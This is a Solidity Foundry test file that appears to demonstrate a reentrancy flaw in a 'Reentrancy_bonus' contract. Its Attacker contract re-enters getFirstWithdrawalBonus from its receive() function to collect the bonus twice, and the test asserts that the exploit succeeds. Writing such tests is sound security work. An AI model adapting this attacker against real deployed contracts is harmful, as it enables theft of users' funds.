
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_bonus} from "../src/Reentrancy_bonus.sol";

contract TestReentrancyReentrancy_bonus is Test {
    Reentrancy_bonus public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_bonus();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // The bonus is hardcoded to 100 wei in the contract.
        // We need the victim to have at least 200 wei to pay out the bonus twice (initial + reentrancy).
        vm.assume(attackVal >= 200 && attackVal < 100 ether);

        // Fund the Victim (so it has ETH to pay rewards)
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_bonus public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        _victim = Reentrancy_bonus(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
    }

    function attack(uint256 val) public {
        // Trigger the vulnerability
        _victim.getFirstWithdrawalBonus(address(this));

        // If we managed to re-enter, the count will be > 1
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the vulnerable function
            _victim.getFirstWithdrawalBonus(address(this));
        }
    }
}
